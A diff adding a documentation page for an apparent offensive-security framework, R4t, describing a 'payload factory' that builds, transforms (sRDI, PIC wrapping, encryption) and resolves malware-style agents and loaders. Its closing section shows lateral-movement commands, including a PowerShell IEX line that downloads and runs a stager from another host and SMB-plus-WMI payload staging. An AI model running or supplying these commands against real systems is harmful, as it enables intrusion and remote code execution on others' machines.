@@ -1,0 +1,364 @@
+---
+title: "Payload Factory"
+description: "R4t's deterministic payload build, transformation, and resolution system"
+---
+
+# Payload Factory
+
+R4t includes a **deterministic, recipe-based payload build and resolution system**. Rather than maintaining a static folder of pre-compiled binaries, R4t treats payloads as build recipes that produce artifacts on demand — compiled, transformed, cached, and resolved automatically.
+
+---
+
+## Why Recipe-Based
+
+A static payload repository breaks down once the operator needs per-target configuration, multiple transports, staged vs stageless outputs, in-memory execution, or artifacts in different formats (EXE, DLL, shellcode, PIC, BOF, scripts). A recipe-based model solves this by treating builds as deterministic results of a build specification.
+
+---
+
+## Architecture Overview
+
+```
+Template          (source definition — Go agent, C loader, BOF, PowerShell stager, etc.)
+   ↓
+Payload           (operator-facing logical name — e.g. "corp-http-agent", "smb-loader")
+   ↓
+Build             (fully specified recipe — OS, arch, format, transport, features, transforms)
+   ↓
+Artifacts         (compiled outputs — EXE, DLL, shellcode, PIC, script, BOF)
+   ↓
+Transformations   (pipeline steps — PE-to-shellcode, sRDI, PIC wrap, encrypt, compress)
+   ↓
+Capabilities      (queryable traits — inmemory=true, reflective=true, pic=true)
+```
+
+Modules request capabilities, not filenames. The resolver finds or builds a matching artifact automatically.
+
+---
+
+## Core Concepts
+
+### Templates
+
+A template is the source definition of something that can be built. It declares:
+
+- Where the source lives
+- Which build environment is required (Go, MinGW, .NET, BOF, PowerShell, Clang/LLVM)
+- Build commands and output conventions
+
+Supported template types:
+
+| Template Type | Description |
+|--------------|-------------|
+| Go Agent | Full Go-based agent binary |
+| C Loader | Lightweight C-based loader |
+| Reflective DLL | DLL with reflective loading stub |
+| BOF Template | Beacon Object File (COFF) |
+| PowerShell Stager | PowerShell-based staging script |
+| Shellcode Wrapper | Raw shellcode wrapper |
+| PIC Loader | Position-independent code loader |
+
+### Payloads
+
+A payload is the operator-facing logical object — a named record tied to a template with optional defaults. Payloads are not files; they are named concepts:
+
+- `corp-http-agent`
+- `smb-loader`
+- `pic-exec`
+- `ldap-helper`
+
+### Builds
+
+A build is a fully specified recipe describing every parameter needed to produce output:
+
+| Property | Description |
+|----------|-------------|
+| Target OS | `windows`, `linux`, `darwin` |
+| Target Architecture | `x64`, `x86`, `arm64` |
+| Output Format | `exe`, `dll`, `shellcode`, `pic`, `bof`, `ps1` |
+| Staging Mode | `staged` or `stageless` |
+| Transport Mode | `http`, `https`, `smb`, `tcp`, `dns` |
+| Feature Flags | Reflective loading, PIC, encryption, compression |
+| Compiler Profile | `go`, `mingw-x64`, `bof`, `dotnet`, `clang` |
+| Evasion Profile | `default`, `custom` |
+| Configuration JSON | Sleep, jitter, transport config, pipe names, keys |
+| Transformation Steps | Ordered pipeline of post-compilation transforms |
+
+Builds are uniquely identified by a **recipe hash** — a SHA-256 of the canonicalized build specification.
+
+### Artifacts
+
+An artifact is the actual output file produced from a build:
+
+| Artifact Type | Role | Execution Type |
+|--------------|------|---------------|
+| EXE | `primary` | `self-exec` |
+| DLL | `primary` or `reflective` | `reflective-load`, `manual-map` |
+| Shellcode | `injectable` | `process-inject` |
+| PIC Blob | `injectable` | `process-inject` |
+| Stage | `stage` | Depends on transport |
+| Stager | `stager` | `self-exec` or `script` |
+| Script (PS1, HTA, JScript) | `loader` | `script` |
+| BOF Object | `injectable` | `manual-map` or runner-specific |
+
+Artifacts are stored in a **content-addressed store** by SHA-256 hash:
+
+```
+~/.local/share/r4t/artifacts/ab/abcdef1234567890...
+```
+
+This provides deduplication, immutability, integrity verification, and safe caching.
+
+### Transformations
+
+Transformations convert one output type into another in an ordered pipeline:
+
+```
+Go EXE
+   ↓ sRDI / PE-to-shellcode
+Shellcode
+   ↓ PIC wrapper
+PIC blob
+   ↓ Encryptor
+Encrypted PIC stage
+```
+
+Supported transformation types:
+
+| Transformation | Input | Output |
+|---------------|-------|--------|
+| PE-to-shellcode | EXE / DLL | Shellcode |
+| sRDI (Shellcode Reflective DLL Injection) | DLL | Reflective shellcode |
+| PIC Wrap | Shellcode | Position-independent code blob |
+| Compression | Any binary | Compressed binary |
+| Encryption | Any binary | Encrypted binary |
+
+### Capabilities
+
+Capabilities are queryable traits attached to builds and artifacts. Modules request capabilities instead of specific files:
+
+| Capability | Description |
+|-----------|-------------|
+| `inmemory=true` | Artifact can execute entirely in memory |
+| `reflective=true` | Artifact supports reflective loading |
+| `pic=true` | Artifact is position-independent |
+| `diskless=true` | No disk write required |
+| `execution=process-inject` | Suitable for process injection |
+| `execution=self-exec` | Self-executing binary |
+| `execution=script` | Script-based execution |
+| `execution=reflective-load` | Reflective DLL loading |
+| `execution=service` | Windows service binary |
+| `transport=http` | HTTP transport |
+| `transport=smb` | SMB transport |
+| `transport=dns` | DNS transport |
+
+---
+
+## Resolution Model
+
+Modules never ask for `somefile.exe`. They describe what they need, and the resolver handles the rest.
+
+### Capability Request Flow
+
+```
+Module
+  ↓
+Capability request (e.g. inmemory=true, pic=true, smb=supported)
+  ↓
+Resolver
+  ↓
+Filter by target OS and architecture
+  ↓
+Match required capabilities against completed builds
+  ↓
+Score candidates by capability weight and artifact suitability
+  ↓
+Return cached artifact  OR  trigger new build
+  ↓
+Build manager acquires lock (recipe hash as mutex)
+  ↓
+Builder compiles source template
+  ↓
+Transformation pipeline derives required output types
+  ↓
+Artifacts stored in content-addressed store
+  ↓
+Resolver returns artifact bytes to module
+```
+
+### Example Resolution
+
+A module requests a Windows x64 PIC-capable in-memory artifact with SMB delivery:
+
+1. Module constructs target profile: OS=Windows, Arch=x64, AllowsInjection=true, AllowsDisk=false
+2. Module sends capability request: `inmemory=true`, `pic=true`, `smb=supported`
+3. Resolver checks existing completed builds
+4. No match found — computes recipe hash for: template=`smb-loader`, OS=`windows`, arch=`x64`, stage=`stageless`, transport=`smb`, format=`dll`, transforms=[`srdi`, `pic-wrap`]
+5. Build manager acquires build lock via database row
+6. Builder compiles the source template
+7. Transformation pipeline converts output to reflective DLL and PIC forms
+8. Artifacts stored, capabilities indexed
+9. Resolver returns PIC artifact bytes to the module
+
+---
+
+## Build Identity and Hashing
+
+### Recipe Hash
+
+Every build is uniquely identified by a SHA-256 hash of its canonicalized recipe:
+
+```json
+{
+  "template_id": "...",
+  "template_version": "v1.2.0",
+  "os": "windows",
+  "arch": "x64",
+  "format": "dll",
+  "stage": "stageless",
+  "transport": "smb",
+  "reflective": true,
+  "pic": true,
+  "encrypted": false,
+  "compressed": false,
+  "compiler_profile": "mingw-x64",
+  "evasion_profile": "default",
+  "config": {"sleep": 5, "channel": "smb"},
+  "transformations": [
+    {"step": 1, "name": "srdi", "options": "{}"},
+    {"step": 2, "name": "pic-wrap", "options": "{}"}
+  ]
+}
+```
+
+JSON keys are canonicalized (sorted) before hashing to ensure semantically identical recipes produce identical hashes.
+
+### Artifact Hash
+
+Each artifact is independently hashed (SHA-256 of its bytes) for content-addressed storage, deduplication, and integrity verification.
+
+---
+
+## Concurrency and Build Locking
+
+Multiple modules can request builds simultaneously. The build system uses the database build row as a lock:
+
+| Step | Action |
+|------|--------|
+| 1 | Compute recipe hash |
+| 2 | Attempt to insert build row with recipe hash |
+| 3 | **Insert succeeds**: own the build, mark as `building` |
+| 4 | Compile and transform |
+| 5 | Write artifacts, mark as `complete` |
+| 6 | **Insert conflicts**: another process handling it — poll until `complete` or `failed` |
+
+### Build States
+
+| State | Description |
+|-------|-------------|
+| `pending` | Build queued but not started |
+| `building` | Build in progress (locked) |
+| `complete` | Build finished, artifacts available |
+| `failed` | Build failed (tracks retry count, last error, timestamp) |
+
+---
+
+## Multi-Language Compilation
+
+Each template declares its required builder environment. The Go application orchestrates builds without being the toolchain itself:
+
+| Builder | Templates |
+|---------|-----------|
+| Go builder | Go agents and tools |
+| MinGW builder | C/C++ loaders and DLLs |
+| BOF builder | Beacon Object Files (COFF) |
+| .NET builder | C# assemblies |
+| Clang/LLVM builder | Cross-platform C/C++ |
+| PowerShell packager | PS1 stagers and scripts |
+
+Builder environments are containerized or isolated for deterministic toolchain versions and reproducible builds.
+
+---
+
+## Per-Target Customization
+
+Because configuration is part of the build recipe, the same logical payload can generate different outputs per target:
+
+| Customization | Example |
+|--------------|---------|
+| Transport | HTTP for internet-facing, SMB for internal lateral movement |
+| Sleep / Jitter | Aggressive (1s) for lab, slow (60s+) for production |
+| Encryption Keys | Unique per-target AES keys |
+| Named Pipes | Custom pipe names per host |
+| Service Names | Unique service names for persistence |
+| Modules | Only include required functionality |
+
+---
+
+## Payload Execution by Protocol
+
+The payload factory integrates with R4t's execution modules to deliver artifacts through different protocols:
+
+| Protocol | Delivery Method | Typical Payload |
+|----------|----------------|----------------|
+| [`wmi`](./commands/wmi) | `Win32_Process.Create` via DCOM/RPC | EXE, PowerShell stager |
+| [`winrm`](./commands/winrm) | WS-Management command execution | EXE, cmd scripts |
+| [`psremote`](./commands/psremote) | PowerShell Remoting (full runspace) | PS1 script, encoded command, reflective DLL |
+| [`smb`](./commands/smb) | File write to remote share + execution | EXE, DLL, service binary |
+| [`ssh`](./commands/ssh) | Remote command execution | ELF binary, shell script |
+| [`mssql`](./commands/mssql) | `xp_cmdshell` / CLR assembly | EXE, PowerShell, .NET assembly |
+
+### WMI Execution
+
+```bash
+# Drop and execute via WMI
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "powershell -ep bypass -enc <base64-stager>"
+```
+
+### PSRemote Execution
+
+```bash
+# Fileless execution via PowerShell Remoting
+r4t psremote exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/stager.ps1')"
+```
+
+### SMB + WMI/WinRM Combination
+
+```bash
+# Stage payload via SMB, execute via WMI
+r4t smb put -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  ./payload.exe C:\Windows\Temp\svc.exe
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "C:\Windows\Temp\svc.exe"
+```
+
+---
+
+## Implementation Roadmap
+
+The payload factory is being implemented in 10 phases:
+
+| Phase | Description |
+|-------|-------------|
+| 1 | **Data Model** — Define database models (Template, Payload, Build, Artifact, Transformation, Capability, TargetProfile) |
+| 2 | **Artifact Store** — Content-addressed storage with hash computation and write-once semantics |
+| 3 | **Recipe Hashing** — Canonical JSON serialization and SHA-256 recipe identity |
+| 4 | **Build Locking** — Database-backed concurrency control with state machine |
+| 5 | **Builder Interfaces** — Language-specific builders (Go, MinGW, BOF, .NET, PowerShell) |
+| 6 | **Transformation Pipeline** — PE-to-shellcode, reflective prep, PIC wrap, compression, encryption |
+| 7 | **Capability Assignment** — Generate and attach queryable capability traits |
+| 8 | **Resolver Logic** — Capability-based selection, scoring, and cache-first resolution |
+| 9 | **Module Integration** — Refactor execution modules to request capabilities instead of paths |
+| 10 | **Observability** — Logging, integrity checks, cleanup policies, and test coverage |
+
+---
+
+## Related Pages
+
+- [Architecture](./architecture) — R4t's layered application architecture
+- [WMI](./commands/wmi) — WMI-based remote execution
+- [WinRM](./commands/winrm) — WinRM remote command execution
+- [PSRemote](./commands/psremote) — PowerShell Remoting operations
+- [SMB](./commands/smb) — SMB file transfer for payload staging
+- [Database](./database) — Build state and artifact metadata storage
